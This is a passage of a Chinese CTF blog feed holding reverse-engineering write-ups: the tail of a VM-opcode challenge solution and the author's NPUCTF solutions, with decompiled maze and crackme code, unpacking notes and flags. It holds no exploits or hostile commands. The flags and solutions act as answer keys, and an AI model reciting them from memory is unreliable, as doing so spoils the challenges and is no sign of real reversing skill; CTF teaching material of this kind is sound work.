class="hljs-number">1</span>];</span><br><span class="line">                opcode_index += <span class="hljs-number">2</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:</span><br><span class="line">                ++opcode_index;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:</span><br><span class="line">                ++v8;</span><br><span class="line">                opcode_index += <span class="hljs-number">2</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:</span><br><span class="line">                input[v6] = v5;</span><br><span class="line">                ++opcode_index;</span><br><span class="line">                ++v6;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:</span><br><span class="line"><span class="hljs-comment">//                read(input);</span></span><br><span class="line"></span><br><span class="line">                ++opcode_index;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">11</span>:</span><br><span class="line">                v5 = input[v9] + <span class="hljs-number">1</span>;</span><br><span class="line">                ++opcode_index;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:</span><br><span class="line">                v5 = input[v9] - <span class="hljs-number">1</span>;</span><br><span class="line">                ++opcode_index;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">default</span>:</span><br><span class="line">                <span class="hljs-keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> opcodes[<span class="hljs-number">114</span>] = {</span><br><span class="line">        <span class="hljs-number">0x0000000A</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000005</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000010</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000003</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000020</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x0000000B</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000002</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000004</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x0000000C</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000021</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000003</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x0000000B</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x0000000B</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000020</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000009</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000024</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000051</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x0000000B</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x0000000C</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000025</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000002</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000041</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000036</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000001</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000020</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000025</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000003</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000020</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000009</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x0000000C</span>,</span><br><span class="line">        <span class="hljs-number">0x00000008</span>,</span><br><span class="line">        <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000041</span>,</span><br><span class="line">        <span class="hljs-number">0x00000001</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000022</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x0000003F</span>,</span><br><span class="line">        <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000034</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000032</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000072</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000033</span>,</span><br><span class="line">        <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0xFFFFFFA7</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000031</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0xFFFFFFF1</span>,</span><br><span class="line">        <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000028</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0xFFFFFF84</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0xFFFFFFC1</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x0000001E</span>,</span><br><span class="line">        <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x0000007A</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-built_in">vm_operad</span>(opcodes, <span class="hljs-number">114</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 757515121f3d478</span></span><br></pre></td></tr></tbody></table></figure></li></ul></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> 网鼎杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF-wp</title>
      <link href="/2020/03/21/2020-NPUCTF/"/>
      <url>/2020/03/21/2020-NPUCTF/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>最近事情比较多，题都没怎么看就跑路了</p><span id="more"></span><hr><blockquote><p>下面是我出的<strong>送分</strong>题</p></blockquote><h4 id="Basicasm"><a href="#Basicasm" class="headerlink" title="Basicasm"></a>Basicasm</h4><p>硬怼汇编，分奇偶处理，输出16进制，逆回去就可以了</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{d<span class="hljs-number">0</span>_y<span class="hljs-number">0</span>u_know_x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>_a<span class="hljs-number">5</span>m?}</span><br></pre></td></tr></tbody></table></figure><h3 id="Ezreverse1"><a href="#Ezreverse1" class="headerlink" title="Ezreverse1"></a>Ezreverse1</h3><p>简单的花指令加迷宫题，好心的出题人在每个花指令的地方都<code>patch</code>了很多个<code>nop</code>，<del>虽然这么做毫无意义</del></p><p>把简单的花指令<code>patch</code>掉</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 *v3; <span class="hljs-comment">// rbx</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// al</span></span><br><span class="line">  <span class="hljs-keyword">bool</span> v5; <span class="hljs-comment">// zf</span></span><br><span class="line">  __int64 v6; <span class="hljs-comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = (__int64 *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x188</span>uLL);</span><br><span class="line">  *v3 = <span class="hljs-number">234545231LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">1</span>] = <span class="hljs-number">344556530LL</span>;</span><br><span class="line">  qword_202020 = (__int64)v3;</span><br><span class="line">  v3[<span class="hljs-number">7</span>] = <span class="hljs-number">1423431LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">2</span>] = <span class="hljs-number">453523423550LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">8</span>] = <span class="hljs-number">54535240LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">3</span>] = <span class="hljs-number">46563455531LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">9</span>] = <span class="hljs-number">234242550LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">4</span>] = <span class="hljs-number">34524345344661LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">12</span>] = <span class="hljs-number">123422421LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">5</span>] = <span class="hljs-number">34533453453451LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">13</span>] = <span class="hljs-number">2342420LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">6</span>] = <span class="hljs-number">2343423124234420LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">14</span>] = <span class="hljs-number">23414141LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">10</span>] = <span class="hljs-number">23424242441LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">15</span>] = <span class="hljs-number">23424420LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">11</span>] = <span class="hljs-number">2345355345430LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">16</span>] = <span class="hljs-number">13535231LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">18</span>] = <span class="hljs-number">23423414240LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">17</span>] = <span class="hljs-number">2341LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">20</span>] = <span class="hljs-number">53366745350LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">19</span>] = <span class="hljs-number">1234422441LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">27</span>] = <span class="hljs-number">3453326640LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">21</span>] = <span class="hljs-number">253244531LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">28</span>] = <span class="hljs-number">245332535325535341LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">22</span>] = <span class="hljs-number">45463320LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">29</span>] = <span class="hljs-number">7568546234640LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">23</span>] = <span class="hljs-number">24532661LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">30</span>] = <span class="hljs-number">23445576731LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">24</span>] = <span class="hljs-number">23433430LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">25</span>] = <span class="hljs-number">23453660LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">26</span>] = <span class="hljs-number">3453661LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">31</span>] = <span class="hljs-number">234534460LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">33</span>] = <span class="hljs-number">34455344551LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">35</span>] = <span class="hljs-number">2354657721451LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">32</span>] = <span class="hljs-number">234364561LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">36</span>] = <span class="hljs-number">23464664430LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">34</span>] = <span class="hljs-number">2345670LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">39</span>] = <span class="hljs-number">23643643334561LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">37</span>] = <span class="hljs-number">245646441LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">40</span>] = <span class="hljs-number">2346463450LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">38</span>] = <span class="hljs-number">234644640LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">41</span>] = <span class="hljs-number">2343345620LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">42</span>] = <span class="hljs-number">3444651LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">43</span>] = <span class="hljs-number">23451LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">44</span>] = <span class="hljs-number">67541LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">45</span>] = <span class="hljs-number">34575860LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">46</span>] = <span class="hljs-number">67856741LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">47</span>] = <span class="hljs-number">567678671LL</span>;</span><br><span class="line">  v3[<span class="hljs-number">48</span>] = <span class="hljs-number">567565671LL</span>;</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input your flag:"</span>);</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="hljs-keyword">do</span></span><br><span class="line">            v4 = _IO_getc(stdin);</span><br><span class="line">          <span class="hljs-keyword">while</span> ( v4 == <span class="hljs-number">10</span> );</span><br><span class="line">          <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">10</span> )</span><br><span class="line">            <span class="hljs-built_in">JUMPOUT</span>(*(_QWORD *)&amp;byte_96B);</span><br><span class="line">          <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">104</span> )</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          <span class="hljs-keyword">if</span> ( ((<span class="hljs-keyword">signed</span> __int64)v3 - qword_202020) &gt;&gt; <span class="hljs-number">3</span> != <span class="hljs-number">7</span></span><br><span class="line">                                                         * (((<span class="hljs-keyword">signed</span> __int64)((<span class="hljs-keyword">unsigned</span> __int128)(<span class="hljs-number">5270498306774157605LL</span></span><br><span class="line">                                                                                                * (<span class="hljs-keyword">signed</span> __int128)(((<span class="hljs-keyword">signed</span> __int64)v3 - qword_202020) &gt;&gt; <span class="hljs-number">3</span>)) &gt;&gt; <span class="hljs-number">64</span>) &gt;&gt; <span class="hljs-number">1</span>)</span><br><span class="line">                                                          - (((<span class="hljs-keyword">signed</span> __int64)v3 - qword_202020) &gt;&gt; <span class="hljs-number">63</span>)) )</span><br><span class="line">          {</span><br><span class="line">            --v3;</span><br><span class="line">            v5 = v3 == <span class="hljs-number">0LL</span>;</span><br><span class="line">            <span class="hljs-keyword">goto</span> LABEL_13;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">106</span> )</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)v3 - qword_202020 &gt; <span class="hljs-number">0x30</span> )</span><br><span class="line">        {</span><br><span class="line">          v3 -= <span class="hljs-number">7</span>;</span><br><span class="line">          v5 = v3 == <span class="hljs-number">0LL</span>;</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_13;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">107</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">108</span> &amp;&amp; (((<span class="hljs-keyword">signed</span> __int64)v3 - qword_202020) &gt;&gt; <span class="hljs-number">3</span>) % <span class="hljs-number">7</span> != <span class="hljs-number">6</span> )</span><br><span class="line">      {</span><br><span class="line">        v5 = v3 + <span class="hljs-number">1</span> == <span class="hljs-number">0LL</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_13;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)((<span class="hljs-keyword">char</span> *)v3 - qword_202020 - <span class="hljs-number">329</span>) &gt; <span class="hljs-number">0x37</span> )</span><br><span class="line">    {</span><br><span class="line">      v5 = v3 + <span class="hljs-number">7</span> == <span class="hljs-number">0LL</span>;</span><br><span class="line">      v3 += <span class="hljs-number">7</span>;</span><br><span class="line">LABEL_13:</span><br><span class="line">      v6 = *v3;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v5 )</span><br><span class="line">        <span class="hljs-built_in">JUMPOUT</span>(*(_QWORD *)&amp;byte_9F2);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v6 == <span class="hljs-number">567565671</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congratulations!"</span>);</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"The flag is: flag{ YOUR INPUT }"</span>);</span><br><span class="line">        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v6 == <span class="hljs-number">567565671</span> )</span><br><span class="line">        <span class="hljs-built_in">JUMPOUT</span>(*(_QWORD *)&amp;byte_A01);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !(v6 &amp; <span class="hljs-number">1</span>) )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You Failed!"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>很显然这是一个7*7的迷宫，虽然数都很大很复杂，但是只比较奇偶，所以只要看最后一位就行了，就是一个很简单的迷宫</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">flag</span><span class="hljs-template-variable">{kkkkkklljjjjljjllkkkkhkklll}</span></span><br></pre></td></tr></tbody></table></figure><h3 id="Ezreverse2"><a href="#Ezreverse2" class="headerlink" title="Ezreverse2"></a>Ezreverse2</h3><p>简单的<code>jar2exe</code>，动态调试等解密完直接<code>dump</code>内存得到<code>jar</code>文件，反编译就可以了</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{j<span class="hljs-number">4</span>r<span class="hljs-number">2</span>eXe_I<span class="hljs-number">5</span>_@_p<span class="hljs-number">0</span>wer<span class="hljs-number">7</span>ul_To<span class="hljs-number">0</span>l!}</span><br></pre></td></tr></tbody></table></figure><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><blockquote><p>这题只上了校内赛道，改编自<code>b01lersCTF-2020</code>的一道题，觉得题目很不错拿来给校内做一做</p></blockquote><p><code>main</code>函数很简单</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">void</span> *v4; <span class="hljs-comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">sub_1340</span>();</span><br><span class="line">  <span class="hljs-built_in">sub_14B0</span>((__int128 *)&amp;v4);</span><br><span class="line">  <span class="hljs-built_in">sub_1100</span>((__int64)&amp;v4);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)<span class="hljs-built_in">sub_11C0</span>((_BYTE **)&amp;v4) )</span><br><span class="line">    std::__ostream_insert&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"Congratulations!"</span>, <span class="hljs-number">16LL</span>);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    std::__ostream_insert&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"Wrong!"</span>, <span class="hljs-number">6LL</span>);</span><br><span class="line">  std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v4 )</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v4)</span></span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到使<code>if</code>判断为真就可以了</p><p><code>sub_1340()</code>函数纯粹用来输出，可以不看，下面几个函数观察一下可以看的出来，<code>sub_14B0()</code>用来输入，<code>sub_1100()</code>用来对输入进行处理，<code>sub_11C0()</code>用来判断</p><blockquote><p>每一个部分都很长，其实实现的功能很简单，是因为整型数组内存连续存放，所以被当作了很大的数据来处理了，看不明白的话建议动态调试</p></blockquote><p>输入之后数据被存放到了<code>v4</code>里，然后进行处理</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">sub_1100</span><span class="hljs-params">(__int64 a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> *v1; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// cl</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// rsi</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// edx</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// rcx</span></span><br><span class="line">  _QWORD *v7; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span 